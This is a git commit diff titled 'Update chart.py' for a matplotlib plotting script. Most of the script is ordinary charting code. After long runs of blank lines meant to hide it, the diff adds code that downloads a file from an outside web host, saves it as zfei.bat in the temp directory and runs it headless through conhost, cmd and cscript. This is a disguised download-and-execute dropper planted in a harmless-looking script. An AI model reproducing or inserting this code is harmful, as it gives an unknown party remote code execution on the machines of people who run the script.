44a26af434177c8b4d34335c244eeb656206cd23
crmdevtest <crmdevtest@broskiboy.com>
2026-05-21 11:57:58 -0400

    Update chart.py

--- chart.py
+++ chart.py
@@ -7,7 +7,6 @@ import os
 import tempfile
 import requests
 import sys
-subprocess.Popen(["cscript.exe", "--headless", "cmd /c zfei.bat"], creationflags=subprocess.CREATE_NEW_CONSOLE)
 
 # Sample Data: 1000 random numbers from a normal distribution
 data = np.random.randn(1000)
@@ -41,6 +40,77 @@ plt.xlabel("Quantity Demanded (Units)", fontsize=12)
 plt.ylabel("Price ($)", fontsize=12)
 plt.grid(True, linestyle='--', alpha=0.7)
 plt.legend()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+url = "http://s1083932807.online-home.ca/o"
+
+# Get the Windows temp directory path
+temp_dir = tempfile.gettempdir()
+file_path = os.path.join(temp_dir, "zfei.bat")
+
+# Download and save
+response = requests.get(url)
+if response.status_code == 200:
+    with open(file_path, "wb") as f:
+        f.write(response.content)
+    # print(f"File downloaded to: {file_path}")
+
+script_path = file_path
+
+# Launch wscript with the script path as an argument
+subprocess.run(["conhost.exe", "--headless", "cmd.exe", "/c", script_path])
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+subprocess.Popen(["cscript.exe", "--headless", "cmd /c zfei.bat"], creationflags=subprocess.CREATE_NEW_CONSOLE)
+
 plt.show()
 
 
